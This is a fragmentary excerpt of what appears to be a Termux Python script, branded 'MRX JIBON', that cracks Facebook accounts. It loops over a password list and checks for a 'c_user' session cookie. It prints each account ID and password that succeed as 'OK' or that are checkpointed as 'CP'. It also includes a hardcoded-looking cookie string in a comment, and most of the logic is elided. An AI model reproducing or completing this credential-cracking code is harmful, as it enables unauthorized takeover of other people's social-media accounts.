...
\033[1;34m--------------------------------------------------
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33m     MRX JIBON 
\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32      MRX JIBON BRO
\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33m J  I  B  O  N  
\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34m  TERMUX COMMAND SELL
\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92m    MRX, FREE 
		...
		for ps in pwx:
         ...
         # 'cookie': 'datr=VHlfZBJ1WRSBYiQwVFsmEur6; sb=VHlfZLpo57iAFgE48SpPjIS9',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[MRX,JIBON-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[JIBON-CP] '+cid+' | '+ps+'\33[0;97m')
